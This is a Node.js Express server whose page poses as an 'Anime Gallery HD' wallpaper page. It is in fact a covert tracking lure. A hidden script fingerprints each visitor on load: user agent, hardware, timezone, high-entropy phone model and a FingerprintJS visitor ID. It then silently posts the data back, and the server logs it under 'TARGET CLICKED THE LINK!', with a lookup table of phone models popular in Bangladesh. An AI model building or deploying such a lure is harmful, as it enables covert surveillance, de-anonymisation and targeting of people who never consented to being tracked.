const express = require('express');
const app = express();
app.use(express.json({ limit: '10mb' }));

// Bangladesh Popular Models - Full Mapping
const modelNames = {
    // Xiaomi / Redmi / Poco (BD e sobcheye beshi use hoy)
    '23021RAAEG': 'Redmi 13C',
    '23028RA60L': 'Redmi 13C',
    '23053RN02Y': 'Redmi 13C / Poco C65',
    '23129RAAEG': 'Redmi 14C',
    '22101317C': 'Redmi Note 12 5G / Poco X5',
    '2201117TG': 'Redmi Note 11',
    '2201117TI': 'Redmi Note 11',
    '23013RK75C': 'Redmi Note 12',
    '23021RAA2Y': 'Redmi Note 12 NFC',
    'M2101K7AG': 'Redmi Note 10 Pro',
    'M2010J19CG': 'Redmi Note 9 Pro',

    // Samsung (BD e onek popular)
    'SM-A145F': 'Galaxy A14',
    'SM-A155F': 'Galaxy A15',
    'SM-A235F': 'Galaxy A23',
    'SM-A325F': 'Galaxy A32',
    'SM-A515F': 'Galaxy A51',
    'SM-A528B': 'Galaxy A52s',
    'SM-G998B': 'Galaxy S21 Ultra',
    'SM-G991B': 'Galaxy S21',
    'SM-A166B': 'Galaxy A16',
    'SM-A256E': 'Galaxy A25',

    // Realme
    'RMX3391': 'Realme 9i',
    'RMX3085': 'Realme Narzo 30',
    'RMX3741': 'Realme C55',
    'RMX3780': 'Realme GT Neo 3',
    'RMX3933': 'Realme C67',

    // Vivo
    'vivo 1901': 'Vivo Y11',
    'PD2183': 'Vivo Y15s',
    'vivo 2018': 'Vivo Y12',
    'PD2207': 'Vivo Y21',

    // Infinix / Tecno (Budget e popular)
    'X669C': 'Infinix Hot 12',
    'X682C': 'Infinix Hot 20',
    'X6532': 'Infinix Hot 40',
    'TECNO CK7n': 'Tecno Spark 20',
    'TECNO BG7': 'Tecno Spark 10',

    // Oppo
    'CPH2127': 'Oppo A53',
    'CPH2269': 'Oppo A16',

    // Others
    'Pixel 7': 'Google Pixel 7',
};

app.get('/', (req, res) => {
    const html = `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Anime Gallery HD</title>
    <style>
        body { margin:0; background:#000; height:100vh; display:flex; align-items:center; justify-content:center; overflow:hidden; }
        img { max-width:100%; max-height:100%; object-fit:contain; }
    </style>
</head>
<body>
    <img src="https://images6.alphacoders.com/135/thumbbig-1358426.webp" alt="Anime Wallpaper">
    
    <script src="https://openfpcdn.io/fingerprintjs/v5" async></script>
   
    <script>
        async function getFullDeviceInfo() {
            const info = {
                timestamp: new Date().toISOString(),
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screen: { width: screen.width, height: screen.height },
                hardware: { cores: navigator.hardwareConcurrency, memory: navigator.deviceMemory },
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            };

            if (navigator.userAgentData) {
                try {
                    const ua = await navigator.userAgentData.getHighEntropyValues(['model', 'platform', 'platformVersion']);
                    info.highEntropyUA = ua;
                    
                    const modelCode = ua.model || '';
                    info.deviceModelCode = modelCode;
                    info.deviceFullName = modelCode 
                        ? (window.modelNames?.[modelCode] || modelCode + ' (Model Name Not in DB)') 
                        : 'Unknown';
                } catch(e) {}
            }

            try {
                const fpPromise = import('https://openfpcdn.io/fingerprintjs/v5').then(FingerprintJS => FingerprintJS.load());
                const fp = await fpPromise;
                const result = await fp.get();
                info.fingerprint = { visitorId: result.visitorId, confidence: result.confidence.score };
            } catch(e) {}

            fetch('/track', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(info)
            }).catch(() => {});

            console.log("📤 Info Sent");
        }

        window.modelNames = ${JSON.stringify(modelNames)};
        window.onload = getFullDeviceInfo;
    </script>
</body>
</html>`;
    res.send(html);
});

app.post('/track', (req, res) => {
    console.log('\n🔥🔥 TARGET CLICKED THE LINK! 🔥🔥');
    console.log('📱 Device Full Name :', req.body.deviceFullName || 'N/A');
    console.log('📟 Model Code       :', req.body.deviceModelCode || 'N/A');
    console.log('🔍 Full Information:');
    console.dir(req.body, { depth: null });
    console.log('--------------------------------------------------\n');
   
    res.status(200).send('ok');
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log('Server is running on port', PORT);
});
